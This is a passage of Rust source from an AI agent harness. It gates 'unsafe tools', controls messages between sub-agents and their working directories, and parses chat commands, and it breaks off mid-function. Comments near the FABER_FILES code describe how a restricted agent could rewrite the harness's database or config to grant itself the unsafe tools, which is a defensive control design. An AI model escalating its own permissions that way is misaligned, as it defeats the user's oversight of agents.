fn task_view(task: &db::TaskRow, ctx: &ToolContext) -> db::TaskRow {
    let mut task = task.clone();
    if !ctx.unsafe_tools && !task.run_safe {
        task.command = "(hidden: made by the user or an agent with the unsafe tools)".to_string();
        task.description = String::new();
        task.last_result = None;
    }
    task
}

/// Whether `receiver` - with the unsafe tools if `receiver_unsafe` - takes
/// a message from `sender`. One with them only takes a safe agent's
/// from its own sub-agents (their results, mostly): the sender's safety
/// was checked when it was sent, but the receiver may have been idle
/// then, without them.
fn accepts_message(
    db: &dyn DbBackend,
    receiver: &str,
    receiver_unsafe: bool,
    sender: &str,
) -> bool {
    !receiver_unsafe
        || agent_is_unsafe(db, sender).unwrap_or(false)
        || made_by(db, sender, Some(receiver)).unwrap_or(false)
}

/// Whether `agent` is `maker`'s sub-agent, or one of theirs, and so on.
fn made_by(db: &dyn DbBackend, agent: &str, maker: Option<&str>) -> Result<bool, Box<dyn Error>> {
    let Some(maker) = maker else {
        return Ok(false);
    };
    Ok(db.agent_lineage(agent)?.iter().skip(1).any(|a| a == maker))
}

/// For an agent faber makes on a task's or a fan-out's behalf: refuses a
/// `name` already taken by an agent `parent` didn't make, which would
/// otherwise have its settings, parent and history overwritten.
fn check_name_free_for(db: &dyn DbBackend, name: &str, parent: &str) -> Result<(), Box<dyn Error>> {
    match db.get_agent(name)? {
        Some(agent) if agent.parent.as_deref() != Some(parent) => Err(format!(
            "an agent named '{}' already exists, not made by '{}'",
            name, parent
        )
        .into()),
        _ => Ok(()),
    }
}

/// `path` as a working directory: absolute (relative ones taken from
/// `base`), symlinks resolved, and an existing directory.
/// The key in `file`: its first line, which must not be empty.
fn read_key_file(file: &str) -> Result<String, Box<dyn Error>> {
    let content = std::fs::read_to_string(file)
        .map_err(|e| format!("can't read the key in {}: {}", file, e))?;
    let key = content.lines().next().unwrap_or("").trim().to_string();
    if key.is_empty() {
        return Err(format!("{} holds no key", file).into());
    }
    Ok(key)
}

/// Where `faber serve` on `address`'s port keeps the key it made:
/// `$XDG_RUNTIME_DIR/faber/serve-<port>.key` (else under
/// `~/.local/state/faber`), only the user's to read.
fn server_key_path(address: &str) -> Option<PathBuf> {
    let port = address.rsplit_once(':')?.1;
    port.parse::<u16>().ok()?;
    let dir = std::env::var_os("XDG_RUNTIME_DIR")
        .map(PathBuf::from)
        .filter(|p| p.is_absolute())
        .or_else(|| std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".local/state")))?;
    Some(dir.join("faber").join(format!("serve-{}.key", port)))
}

/// Makes a new random key for `faber serve` on `bind`, and writes it
/// (`server_key_path`) for clients on this machine to find.
fn write_server_key(bind: &str) -> Result<String, Box<dyn Error>> {
    use std::io::Read;
    use std::os::unix::fs::{DirBuilderExt, OpenOptionsExt};
    let path = server_key_path(bind).ok_or_else(|| format!("no port in '{}'", bind))?;
    let mut bytes = [0u8; 32];
    std::fs::File::open("/dev/urandom")?.read_exact(&mut bytes)?;
    let key: String = bytes.iter().map(|b| format!("{:02x}", b)).collect();
    let dir = path.parent().ok_or("no directory for the key")?;
    std::fs::DirBuilder::new()
        .recursive(true)
        .mode(0o700)
        .create(dir)?;
    let _ = std::fs::remove_file(&path);
    let mut file = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o600)
        .open(&path)?;
    std::io::Write::write_all(&mut file, format!("{}\n", key).as_bytes())?;
    println!("Key for clients: {}", path.display());
    Ok(key)
}

/// Whether `address` (`host:port`) is on the loopback interface - the only
/// one a key found on this machine is sent to, or `--no-auth` serves on.
fn is_loopback_address(address: &str) -> bool {
    let host = address.rsplit_once(':').map_or(address, |(host, _)| host);
    let host = host.trim_start_matches('[').trim_end_matches(']');
    host.eq_ignore_ascii_case("localhost")
        || host
            .parse::<std::net::IpAddr>()
            .is_ok_and(|ip| ip.is_loopback())
}

/// `$XDG_CONFIG_HOME/faber/config.json` (or `~/.config/...`): the config
/// file read when none is given.
fn default_config_file() -> Option<PathBuf> {
    let base = std::env::var_os("XDG_CONFIG_HOME")
        .map(PathBuf::from)
        .filter(|p| p.is_absolute())
        .or_else(|| std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".config")))?;
    Some(base.join("faber").join("config.json"))
}

/// faber's own files: the database and the config file in use, as
/// absolute paths. No agent's working directory may hold them: an agent
/// without the unsafe tools can write where it works - with the file
/// tools, or in its sandbox - and could give itself the unsafe tools in
/// the database, or a command to run in the config file (an MCP server's),
/// and read every agent's conversation.
static FABER_FILES: std::sync::OnceLock<Vec<(&'static str, PathBuf)>> = std::sync::OnceLock::new();

fn set_faber_files(config: Option<&str>, db: Option<&str>) {
    let absolute = |path: &str| {
        let path = std::path::Path::new(path);
        // A database not made yet: where it will be.
        path.canonicalize().ok().or_else(|| {
            let parent = path.parent().filter(|p| !p.as_os_str().is_empty());
            let dir = parent
                .map_or_else(std::env::current_dir, |p| p.canonicalize())
                .ok()?;
            Some(dir.join(path.file_name()?))
        })
    };
    let files = [("config file", config), ("database", db)]
        .into_iter()
        .filter_map(|(what, path)| Some((what, absolute(path?)?)))
        .collect();
    let _ = FABER_FILES.set(files);
}

/// Refuses `dir` as a working directory when it holds one of faber's own
/// files (`FABER_FILES`).
fn check_no_faber_files(dir: &std::path::Path) -> Result<(), String> {
    faber_files_outside(dir, FABER_FILES.get().map_or(&[], |f| f.as_slice()))
}

fn faber_files_outside(
    dir: &std::path::Path,
    files: &[(&'static str, PathBuf)],
) -> Result<(), String> {
    let dir = dir.canonicalize().unwrap_or_else(|_| dir.to_path_buf());
    for (what, file) in files {
        if file.starts_with(&dir) {
            return Err(format!(
                "faber's {} ({}) is inside {}, where agents would work: one could rewrite it, \
                 and give itself the unsafe tools. Keep it elsewhere - e.g. the database in \
                 ~/.local/share/faber/, the config file in ~/.config/faber/config.json - or \
                 work in another directory",
                what,
                file.display(),
                dir.display()
            ));
        }
    }
    Ok(())
}

fn resolve_cwd(base: &std::path::Path, path: &str) -> Result<String, String> {
    let path = std::path::Path::new(path.trim());
    let full = if path.is_absolute() {
        path.to_path_buf()
    } else {
        base.join(path)
    };
    let resolved = full
        .canonicalize()
        .map_err(|e| format!("can't work in '{}': {}", full.display(), e))?;
    if !resolved.is_dir() {
        return Err(format!(
            "can't work in '{}': not a directory",
            resolved.display()
        ));
    }
    check_no_faber_files(&resolved)?;
    resolved
        .to_str()
        .map(String::from)
        .ok_or_else(|| format!("'{}' is not valid UTF-8", resolved.display()))
}

/// Where an agent made by `ctx`'s agent works: `requested` - which only
/// an agent with the unsafe tools may ask for - or where its maker works.
fn child_cwd(ctx: &ToolContext, requested: Option<&str>) -> Result<Option<String>, String> {
    match requested {
        Some(_) if !ctx.unsafe_tools => Err(
            "only the user, or an agent with the unsafe tools, can choose where an agent works: \
             an agent you make works where you do"
                .to_string(),
        ),
        Some(path) => resolve_cwd(&ctx.cwd(), path).map(Some),
        None => Ok(ctx.cwd.as_ref().and_then(|c| c.to_str()).map(String::from)),
    }
}

/// How long an agent made for one job stays once it's done, its outcome
/// shown (green or red) in `faber agents` and the web UI.
const ONE_JOB_AGENT_LINGER_SECS: i64 = 600;

/// Removes the agents made for one job - fan-out workers, tasks' agents -
/// that are done and have lingered (`db::one_job_agents_done`), with
/// their conversations and events. Every session does it, every minute.
fn remove_one_job_agents_done(db: &dyn DbBackend) -> Result<Vec<String>, Box<dyn Error>> {
    let agents = db.list_agents()?;
    let mut one_job = std::collections::HashSet::new();
    for agent in &agents {
        if agent.parent.is_some() && db.get_agent_data(&agent.name, db::ONE_JOB_KEY)?.is_some() {
            one_job.insert(agent.name.clone());
        }
    }
    let done = db::one_job_agents_done(
        &agents,
        &one_job,
        chrono::Utc::now(),
        chrono::Duration::seconds(ONE_JOB_AGENT_LINGER_SECS),
    );
    for name in &done {
        db.delete_agent(name)?;
    }
    Ok(done)
}

/// Records where `agent` works (`None`: the process's directory).
fn set_agent_cwd(
    db: &dyn DbBackend,
    agent: &str,
    cwd: Option<String>,
) -> Result<(), Box<dyn Error>> {
    let mut config = db.get_agent_config(agent)?;
    config.cwd = cwd;
    db.set_agent_config(agent, &config)
}

/// Records whether `agent` has the unsafe tools.
fn set_agent_unsafe(
    db: &dyn DbBackend,
    agent: &str,
    unsafe_tools: bool,
) -> Result<(), Box<dyn Error>> {
    let mut config = db.get_agent_config(agent)?;
    config.unsafe_tools = Some(unsafe_tools);
    db.set_agent_config(agent, &config)
}

/// The tools of an agent with `config`, unsafe or not: those of `within`
/// (by name - an agent never gets a tool its maker lacks), in their safe
/// or unsafe version, narrowed by its config's list.
fn agent_tools(
    within: &ToolsCollection,
    unsafe_tools: bool,
    config: &db::AgentConfig,
) -> ToolsCollection {
    let mut tools = initialize_tools(unsafe_tools, None);
    tools.retain(|name, _| within.contains_key(name));
    // Offered no profiles to choose from, nor is it.
    let profiles_offered = within.values().any(|t| t.schema.contains("\"profile\""));
    if !profiles_offered {
        tools = without_profile_params(tools);
    }
    effective_tools(&tools, config)
}

/// Every tool a session's agents could get - the unsafe ones too, which
/// `agent_tools` then picks from per agent.
fn session_tools(opts: &Opts) -> ToolsCollection {
    if opts.no_tools {
        return ToolsCollection::new();
    }
    let allowed = (!opts.tools.is_empty()).then(|| opts.tools.clone());
    let tools = initialize_tools(true, allowed.as_deref());
    if opts.profiles.is_empty() {
        without_profile_params(tools)
    } else {
        tools
    }
}

/// The tools an agent with `config` gets of `available`: all of them, or
/// only those its config lists.
fn effective_tools(available: &ToolsCollection, config: &db::AgentConfig) -> ToolsCollection {
    match &config.tools {
        None => available.clone(),
        Some(names) => available
            .iter()
            .filter(|(name, _)| names.contains(name))
            .map(|(name, tool)| (name.clone(), tool.clone()))
            .collect(),
    }
}

/// Sends a prompt to the OpenAI API and prints the AI's response to standard output.
fn post_request_and_print_output(
    prompt: &String,
    system_prompts: Option<Vec<String>>,
    opts: &Opts,
    db: Option<Arc<dyn DbBackend>>,
    mcp_manager: Option<Arc<faber::mcp::McpManager>>,
) -> Result<(), Box<dyn Error>> {
    debug!("Prompt: {}", prompt);

    let model = opts.model.clone().unwrap_or(DEFAULT_MODEL.to_string());
    debug!("Using model: {}", model);

    let parameters = parse_parameters(&opts.parameter)?;

    let endpoint = opts
        .endpoint
        .clone()
        .unwrap_or_else(|| DEFAULT_ENDPOINT.to_string());
    let normalized_endpoint = openai::normalize_endpoint(&endpoint);

    let openai_opts = openai::Opts {
        max_tokens: opts.max_tokens,
        model: model,
        endpoint: normalized_endpoint,
        tool_choice: opts.tool_choice.clone(),
        api_key: opts.api_key.clone(),
        max_retries: None,
        retry_base_delay_secs: None,
        parameters,
    };

    let allowed_tools = if opts.tools.is_empty() {
        None
    } else {
        Some(opts.tools.clone())
    };
    let tools = match opts.no_tools {
        true => {
            debug!("Tools are disabled");
            ToolsCollection::new()
        }
        false => {
            debug!("Initializing tools for AI request");
            initialize_tools(opts.unsafe_tools, allowed_tools.as_deref())
        }
    };

    let mut messages = initialize_chat_messages(&tools, opts);

    if let Some(ref sys_prompts) = system_prompts {
        debug!("Using {} system prompts", sys_prompts.len());
        for sp in sys_prompts {
            messages.push(make_message("system", sp.clone()));
        }
    }
    messages.push(make_message("user", prompt.clone()));

    let mut tool_context = ToolContext::new(|msg: &str| {
        println!("{}", msg);
    });
    tool_context.db = db;
    tool_context.mcp = session_mcp(&mcp_manager, &db::AgentConfig::default(), opts);
    tool_context.unsafe_tools = opts.unsafe_tools;

    let response: OpenAIResponse = post_request(messages, &tools, &openai_opts, &tool_context)?;

    if let Some(choices) = response.choices {
        debug!("Received {} choices in response", choices.len());
        if let Some(choice) = choices.first() {
            if let Some(content) = &choice.message.content {
                println!("{}", content);
            }
        }
    } else {
        warn!("No choices received in the AI response");
    }
    Ok(())
}

/// Sends the concatenated content of specified files as a prompt to the AI.
fn prompt_command(
    prompt: &String,
    files: &Vec<String>,
    opts: &Opts,
    db: Option<Arc<dyn DbBackend>>,
    mcp_manager: Option<Arc<faber::mcp::McpManager>>,
) -> Result<(), Box<dyn Error>> {
    debug!("Executing prompt command with {} files", files.len());
    let mut system_prompts: Vec<String> = vec![];

    for file in files {
        debug!("Reading file for prompt context: {}", file);
        let contents = fs::read_to_string(file)?;
        system_prompts.push(contents);
    }
    post_request_and_print_output(prompt, Some(system_prompts), opts, db, mcp_manager)
}

enum ChatCommand {
    Help,
    Quit,
    Clear,
    Show,
    Limit(usize),
    Backtrace(usize),
    Summarize,
    System(String),
    Agents,
    CreateAgent(String),
    SelectAgent(String),
    DeleteAgent(String),
    McpRefresh,
    Tools,
    Chdir(String),
    /// Show (`None`), set or clear (`-`) where the current agent works.
    Cwd(Option<String>),
    Pwd,
    Cost,
    Plan,
    Cancel(String),
    Message(String),
    Empty,
    Invalid(String),
}

fn parse_chat_command(line: &str) -> ChatCommand {
    if line.is_empty() {
        return ChatCommand::Empty;
    }

    let normalized = if line.starts_with('\\') {
        format!("/{}", &line[1..])
    } else {
        line.to_string()
    };

    if normalized == "/help" {
        return ChatCommand::Help;
    }
    if normalized == "/quit" {
        return ChatCommand::Quit;
    }
    if normalized == "/clear" {
        return ChatCommand::Clear;
    }
    if normalized == "/show" {
        return ChatCommand::Show;
    }
    if normalized.starts_with("/limit ") {
        let parts: Vec<&str> = normalized.split_whitespace().collect();
        if parts.len() == 2 {
            if let Ok(n) = parts[1].parse::<usize>() {
                return ChatCommand::Limit(n);
            }
        }
        return ChatCommand::Invalid("Usage: /limit <number_of_messages>".to_string());
    }
    if normalized.starts_with("/backtrace ") {
        let parts: Vec<&str> = normalized.split_whitespace().collect();
        if parts.len() == 2 {
            if let Ok(n) = parts[1].parse::<usize>() {
                return ChatCommand::Backtrace(n);
            }
        }
        return ChatCommand::Invalid("Usage: /backtrace <number_of_messages>".to_string());
    }
    if normalized == "/summarize" {
        return ChatCommand::Summarize;
    }
    if normalized.starts_with("/system ") {
        let system_message = normalized
            .strip_prefix("/system ")
            .unwrap_or("")
            .to_string();
        if !system_message.is_empty() {
            return ChatCommand::System(system_message);
        }
        return ChatCommand::Invalid("Usage: /system <message>".to_string());
    }

    if normalized == "/agents" {
        return ChatCommand::Agents;
    }
    if normalized.starts_with("/create-agent ") {
        let name = normalized
            .strip_prefix("/create-agent ")
            .unwrap()
            .trim()
            .to_string();
        if name.is_empty() {
            return ChatCommand::Invalid("Usage: /create-agent <name>".to_string());
        }
        return ChatCommand::CreateAgent(name);
    }
    if normalized.starts_with("/select-agent ") {
        let name = normalized
            .strip_prefix("/select-agent ")
            .unwrap()
            .trim()
            .to_string();
        if name.is_empty() {
            return ChatCommand::Invalid("Usage: /select-agent <name>".to_string());
        }
        return ChatCommand::SelectAgent(name);
    }
    if normalized.starts_with("/delete-agent ") {
        let name = normalized
            .strip_prefix("/delete-agent ")
            .unwrap()
            .trim()
            .to_string();
        if name.is_empty() {
            return ChatCommand::Invalid("Usage: /delete-agent <name>".to_string());
        }
        return ChatCommand::DeleteAgent(name);
    }
    if normalized == "/mcp-refresh" {
        return ChatCommand::McpRefresh;
    }
    if normalized == "/tools" {
        return ChatCommand::Tools;
    }
    if normalized.starts_with("/chdir ") {
        let path = normalized
            .strip_prefix("/chdir ")
            .unwrap()
            .trim()
            .to_string();
        if path.is_empty() {
            return ChatCommand::Invalid("Usage: /chdir <path>".to_string());
        }
        return ChatCommand::Chdir(path);
    }
    if normalized == "/pwd" {
        return ChatCommand::Pwd;
    }
    if normalized == "/cwd" {
        return ChatCommand::Cwd(None);
    }
    if let Some(path) = normalized.strip_prefix("/cwd ") {
        return ChatCommand::Cwd(Some(path.trim().to_string()).filter(|p| !p.is_empty()));
    }
    if normalized == "/cost" {
        return ChatCommand::Cost;
    }
    if normalized == "/plan" {
        return ChatCommand::Plan;
    }
    if let Some(name) = normalized.strip_prefix("/cancel") {
        let name = name.trim();
        if name.is_empty() {
            return ChatCommand::Invalid("Usage: /cancel <sub-agent>".to_string());
        }
        return ChatCommand::Cancel(name.to_string());
    }

    if normalized.starts_with('/') {
        return ChatCommand::Invalid(format!("Unknown command: {}", normalized));
    }

    ChatCommand::Message(line.to_string())
}

fn build_openai_opts(opts: &Opts, agent_config: &db::AgentConfig) -> openai::Opts {
    let endpoint = opts
        .endpoint
        .clone()
        .unwrap_or_else(|| DEFAULT_ENDPOINT.to_string());
    let session = openai::Opts {
        max_tokens: opts.max_tokens,
        model: opts.model.clone().unwrap_or(DEFAULT_MODEL.to_string()),
        endpoint: openai::normalize_endpoint(&endpoint),
        tool_choice: opts.tool_choice.clone(),
        api_key: opts.api_key.clone(),
        max_retries: None,
        retry_base_delay_secs: None,
        parameters: parse_parameters(&opts.parameter).unwrap_or_default(),
    };
    with_agent_config(&session, agent_config)
}

/// `base` with what an agent's own config sets in its place; its
/// parameters are added to `base`'s, replacing those with the same name.
fn with_agent_config(base: &openai::Opts, config: &db::AgentConfig) -> openai::Opts {
    let mut opts = base.clone();
    if let Some(model) = &config.model {
        opts.model = model.clone();
    }
    if let Some(endpoint) = &config.endpoint {
        opts.endpoint = openai::normalize_endpoint(endpoint);
    }
    if let Some(api_key) = &config.api_key {
        opts.api_key = Some(api_key.clone());
    }
    if let Some(max_tokens) = config.max_tokens {
        opts.max_tokens = Some(max_tokens);
    }
    if let Some(parameters) = &config.parameters {
        opts.parameters.extend(parameters.clone());
    }
    opts
}

fn initialize_agent_messages(
    tools: &ToolsCollection,
    opts: &Opts,
    agent_config: &db::AgentConfig,
) -> Vec<Message> {
    let mut messages = initialize_chat_messages(tools, opts);
    if let Some(ref prompt) = agent_config.system_prompt {
        messages.push(make_message("system", prompt.clone()));
    }
    messages
}

fn handle_chat_command(
    command: ChatCommand,
    active_agent: &mut AgentState,
    tools: &ToolsCollection,
    opts: &Opts,
    chat_pb: &ChatPrinter,
    db: &Option<Arc<dyn DbBackend>>,
    openai_opts: &mut openai::Opts,
    prompt_text: &Arc<Mutex<String>>,
    agent_names: &Arc<Mutex<Vec<String>>>,
    session_id: &str,
    mcp_manager: &Option<Arc<faber::mcp::McpManager>>,
    status_bar: &status_bar::StatusBar,
    session_usage: &Arc<Mutex<SessionUsage>>,
    model_pricing: &Arc<Mutex<Option<openai::Pricing>>>,
    running_subagents: &RunningSubAgents,
) -> Result<bool, Box<dyn Error>> {
    let messages = &mut active_agent.messages;
    match command {
        ChatCommand::Help => {
            chat_pb.println("Available commands:");
            chat_pb.println("  /help                  Show this help message");
            chat_pb.println("  /quit                  Exit the chat session");
            chat_pb.println("  /clear                 Clear chat history");
            chat_pb.println("  /show                  Show current chat history");
            chat_pb.println("  /limit <n>             Keep only the last n messages");
            chat_pb.println("  /backtrace <n>         Remove the last n messages");
            chat_pb.println("  /summarize             Replace the chat history with a summary");
            chat_pb.println("  /system <message>      Add a system message to the conversation");
            chat_pb.println("  /agents                List all agents");
            chat_pb.println("  /create-agent <name>   Create a new agent");
            chat_pb.println("  /select-agent <name>   Switch to an existing agent");
            chat_pb.println("  /delete-agent <name>   Delete an agent");
            chat_pb.println("  /mcp-refresh           Refresh MCP tool definitions");
            chat_pb.println("  /tools                 List all available tools");
            chat_pb.println("  /chdir <path>          Change the current working directory");
            chat_pb.println(
                "  /cwd [<path>|-]        Show, set or clear (-) where this agent works, for it only",
            );
            chat_pb.println("  /pwd                   Show the current working directory");
            chat_pb.println("  /cost                  Show session token usage and estimated cost");
            chat_pb.println("  /plan                  Show the current agent's plan");
            chat_pb.println("  /cancel <sub-agent>    Stop a running sub-agent");
            Ok(true)
        }
        ChatCommand::Quit => Ok(false),
        ChatCommand::Clear => {
            *messages = initialize_chat_messages(tools, opts);
            active_agent.last_prompt_tokens = None;
            if let Some(db) = db {
                db.clear_agent_messages(&active_agent.name)?;
                db.delete_agent_data(&active_agent.name, PLAN_DATA_KEY)?;
            }
            status_bar.set_agent_plan(&active_agent.name, None);
            chat_pb.println("Chat history cleared.");
            Ok(true)
        }
        ChatCommand::Show => {
            if messages.is_empty() {
                chat_pb.println("Chat history is empty.");
            } else {
                chat_pb.println("Current chat history:");
                for (i, msg) in messages.iter().enumerate() {
                    chat_pb.println(&format!(
                        "{}: [{}] {}",
                        i + 1,
                        msg.role,
                        msg.content.as_ref().unwrap_or(&"<no content>".to_string())
                    ));
                    if let Some(tool_calls) = &msg.tool_calls {
                        if !tool_calls.is_empty() {
                            chat_pb.println("  Tool Calls:");
                            for (j, tool_call) in tool_calls.iter().enumerate() {
                                chat_pb.println(&format!(
                                    "    {}.{}: {} ({})",
                                    i + 1,
                                    j + 1,
                                    tool_call.function.name,
                                    tool_call.id
                                ));
                                chat_pb.println(&format!(
                                    "      Args: {}",
                                    tool_call.function.arguments
                                ));
                            }
                        }
                    }
                }
            }
            Ok(true)
        }
        ChatCommand::Limit(n) => {
            if n == 0 {
                chat_pb.println("Limit cannot be zero. Clearing history instead.");
                *messages = initialize_chat_messages(tools, opts);
                active_agent.last_prompt_tokens = None;
                if let Some(db) = db {
                    db.clear_agent_messages(&active_agent.name)?;
                }
            } else if messages.len() > n {
                *messages = messages.split_off(messages.len() - n);
                active_agent.last_prompt_tokens = None;
                chat_pb.println(&format!("Chat history limited to the last {} messages.", n));
            } else {
                chat_pb.println(&format!(
                    "Chat history is already within the limit of {}.",
                    n
                ));
            }
            Ok(true)
        }
        ChatCommand::Backtrace(n) => {
            if n == 0 {
                chat_pb.println("Backtrace steps must be a positive number.");
            } else if n > messages.len() {
                chat_pb.println(&format!(
                    "Cannot go back {} steps, history has only {} messages. Clearing history.",
                    n,
                    messages.len()
                ));
                *messages = initialize_chat_messages(tools, opts);
                active_agent.last_prompt_tokens = None;
                if let Some(db) = db {
                    db.clear_agent_messages(&active_agent.name)?;
                }
            } else {
                messages.truncate(messages.len() - n);
                active_agent.last_prompt_tokens = None;
                chat_pb.println(&format!("Went back {} steps in chat history.", n));
            }
            Ok(true)
        }
        ChatCommand::System(system_message) => {
            messages.push(make_message("system", system_message));
            chat_pb.println("System message added to conversation.");
            Ok(true)
        }
        ChatCommand::Agents => {
            if let Some(db) = db {
                let agents = db.list_agents()?;
                if agents.is_empty() {
                    chat_pb.println("No agents.");
                } else {
                    let mut table = Table::new();
                    table.set_format(*format::consts::FORMAT_NO_BORDER_LINE_SEPARATOR);
                    table.set_titles(Row::new(vec![
                        Cell::new("Name"),
                        Cell::new("Description"),
                        Cell::new("Messages"),
                        Cell::new("Active"),
                    ]));
                    for agent in &agents {
                        let count = db.agent_message_count(&agent.name)?;
                        let active = if agent.name == active_agent.name {
                            "* (this session)"
                        } else if agent.session_id.is_some()
                            && agent.heartbeat_at.as_ref().is_some_and(|hb| {
                                chrono::NaiveDateTime::parse_from_str(hb, "%Y-%m-%d %H:%M:%S")
                                    .is_ok_and(|dt| {
                                        chrono::Utc::now()
                                            .naive_utc()
                                            .signed_duration_since(dt)
                                            .num_seconds()
                                            < 10
                                    })
                            })
                        {
                            "* (other session)"
                        } else {
                            ""
                        };
                        table.add_row(Row::new(vec![
                            Cell::new(&agent.name),
                            Cell::new(&agent.description),
                            Cell::new(&count.to_string()),
                            Cell::new(active),
                        ]));
                    }
                    chat_pb.println(&table.to_string());
                }
            } else {
                chat_pb.println("Database not configured.");
            }
            Ok(true)
        }
        ChatCommand::CreateAgent(name) => {
            if let Some(db) = db {
                match db.create_agent(&name, "") {
                    Ok(_) => {
                        if let Ok(mut names) = agent_names.lock() {
                            if !names.contains(&name) {
                                names.push(name.clone());
                            }
                        }
                        chat_pb.println(&format!(
                            "Agent '{}' created. Use /select-agent {} to switch.",
                            name, name
                        ));
                    }
                    Err(e) => {
                        chat_pb.println(&format!("Failed to create agent: {}", e));
                    }
                }
            } else {
                chat_pb.println("Database not configured.");
            }
            Ok(true)
        }
        ChatCommand::SelectAgent(name) => {
            if name == active_agent.name {
                chat_pb.println(&format!("Already on agent '{}'.", name));
                return Ok(true);
            }
            if let Some(db) = db {
                if db.get_agent(&name)?.is_none() {
                    chat_pb.println(&format!(
                        "Agent '{}' not found. Use /create-agent {} first.",
                        name, name
                    ));
                    return Ok(true);
                }

                if !db.claim_agent(&name, session_id)? {
                    chat_pb.println(&format!(
                        "Agent '{}' is already claimed by another session.",
                        name
                    ));
                    return Ok(true);
                }

                let msgs: Vec<serde_json::Value> = active_agent
                    .messages
                    .iter()
                    .map(|m| serde_json::to_value(m).unwrap())
                    .collect();
                db.save_agent_messages(&active_agent.name, &msgs)?;
                db.release_agent(&active_agent.name, session_id)?;
                status_bar.set_agent_plan(&active_agent.name, None);
                refresh_plan_status(status_bar, db.as_ref(), &name);

                let agent_config = db.get_agent_config(&name)?;
                *openai_opts = build_openai_opts(opts, &agent_config);

                let vals = db.load_agent_messages(&name)?;
                let loaded: Vec<Message> = vals
                    .into_iter()
                    .map(|v| serde_json::from_value(v).unwrap())
                    .collect();
                active_agent.name = name.clone();
                if loaded.is_empty() {
                    active_agent.messages = initialize_agent_messages(tools, opts, &agent_config);
                } else {
                    active_agent.messages = loaded;
                }
                // A different agent (possibly a different model/endpoint,
                // via the config reload just above) - whatever was last
                // known about the previous agent's context size doesn't
                // apply here.
                active_agent.last_prompt_tokens = None;

                *prompt_text.lock().map_err(|e| format!("lock: {}", e))? =
                    format!("{}", agent_style(&name).apply_to(format!("{}> ", name)));

                status_bar.set_color(agent_ansi_code(&name));

                chat_pb.println(&format!("Switched to agent '{}'.\n", name));
            } else {
                chat_pb.println("Database not configured.");
            }
            Ok(true)
        }
        ChatCommand::DeleteAgent(name) => {
            if name == "default" {
                chat_pb.println("Cannot delete the default agent.");
                return Ok(true);
            }
            if name == active_agent.name {
                chat_pb.println("Cannot delete the active agent. Switch first with /select-agent.");
                return Ok(true);
            }
            if let Some(db) = db {
                if db.delete_agent(&name)? {
                    // The stored plan goes with the agent (agent_data
                    // cascades); drop the status bar's copy too.
                    status_bar.set_agent_plan(&name, None);
                    if let Ok(mut names) = agent_names.lock() {
                        names.retain(|n| n != &name);
                    }
                    chat_pb.println(&format!("Agent '{}' deleted.", name));
                } else {
                    chat_pb.println(&format!("Agent '{}' not found.", name));
                }
            } else {
                chat_pb.println("Database not configured.");
            }
            Ok(true)
        }
        ChatCommand::McpRefresh => {
            if let Some(mcp) = mcp_manager {
                match mcp.refresh() {
                    Ok(count) => {
                        chat_pb.println(&format!("MCP tools refreshed: {} tools available", count));
                    }
                    Err(e) => {
                        chat_pb.println(&format!("MCP refresh failed: {}", e));
                    }
                }
            } else {
                chat_pb.println("No MCP servers configured.");
            }
            Ok(true)
        }
        ChatCommand::Tools => {
            let mut names: Vec<&String> = tools.keys().collect();
            names.sort();
            if !names.is_empty() {
                chat_pb.println("Built-in tools:");
                for name in &names {
                    chat_pb.println(&format!("  {}", name));
                }
            }
            if let Some(mcp) = mcp_manager {
                let schemas = mcp.get_tool_schemas();
                if !schemas.is_empty() {
                    chat_pb.println("MCP tools:");
                    let mut mcp_names: Vec<String> = schemas
                        .iter()
                        .filter_map(|s| {
                            s.get("function")
                                .and_then(|f| f.get("name"))
                                .and_then(|n| n.as_str())
                                .map(|n| n.to_string())
                        })
                        .collect();
                    mcp_names.sort();
                    for name in &mcp_names {
                        chat_pb.println(&format!("  {}", name));
                    }
                }
            }
            if names.is_empty()
                && mcp_manager
                    .as_ref()
                    .map_or(true, |m| m.get_tool_schemas().is_empty())
            {
                chat_pb.println("No tools available.");
            }
            Ok(true)
        }
        ChatCommand::Chdir(path) => {
            // A user-typed, explicit directory change - unlike a model tool
            // call, there's no confinement to preserve here, and every tool
            // that resolves paths (read_file/write_file/patch_file/glob/
            // run_command's sandbox bind/...) re-resolves "." at call time,
            // so they all pick this up automatically with no further wiring.
            match std::env::set_current_dir(&path) {
                Ok(()) => match std::env::current_dir() {
                    Ok(cwd) => {
                        chat_pb.println(&format!("Changed directory to {}", cwd.display()));
                    }
                    Err(e) => {
                        chat_pb.println(&format!(
                            "Changed directory, but couldn't read it back: {}",
                            e
                        ));
                    }
                },
                Err(e) => {
                    chat_pb.println(&format!("Failed to change directory to '{}': {}", path, e));
                }
            }
            Ok(true)
        }
        ChatCommand::Pwd => {
            match std::env::current_dir() {
                Ok(cwd) => chat_pb.println(&cwd.display().to_string()),
                Err(e) => chat_pb.println(&format!("Failed to get current directory: {}", e)),
            }
            if let Some(cwd) = db
                .as_ref()
                .and_then(|db| db.get_agent_config(&active_agent.name).ok())
                .and_then(|c| c.cwd)
            {
                chat_pb.println(&format!("('{}' works in {})", active_agent.name, cwd));
            }
            Ok(true)
        }
        ChatCommand::Cwd(path) => {
            // The user's to choose, unlike an agent's (see `child_cwd`).
            let db = db
                .as_ref()
                .ok_or("an agent's own working directory needs a database")?;
            let current = db.get_agent_config(&active_agent.name)?.cwd;
            match path.as_deref() {
                None => chat_pb.println(&match current {
                    Some(cwd) => format!("'{}' works in {}", active_agent.name, cwd),
                    None => format!(
                        "'{}' works in the current directory, {}",
                        active_agent.name,
                        std::env::current_dir()?.display()
                    ),
                }),
                Some("-") => {
                    set_agent_cwd(db.as_ref(), &active_agent.name, None)?;
                    chat_pb.println(&format!(
                        "'{}' works in the current directory again",
                        active_agent.name
                    ));
                }
                Some(path) => {
                    let cwd = resolve_cwd(&std::env::current_dir()?, path)?;
                    set_agent_cwd(db.as_ref(), &active_agent.name, Some(cwd.clone()))?;
                    chat_pb.println(&format!("'{}' now works in {}", active_agent.name, cwd));
                }
            }
            Ok(true)
        }
        ChatCommand::Cost => {
            let usage = *session_usage.lock().unwrap_or_else(|e| e.into_inner());
            chat_pb.println(&format!(
                "Session usage ({} turn{}):",
                usage.turns,
                if usage.turns == 1 { "" } else { "s" }
            ));
            chat_pb.println(&format!("  Prompt tokens:     {}", usage.prompt_tokens));
            chat_pb.println(&format!("  Completion tokens: {}", usage.completion_tokens));
            chat_pb.println(&format!("  Total tokens:      {}", usage.total_tokens));
            let pricing = model_pricing
                .lock()
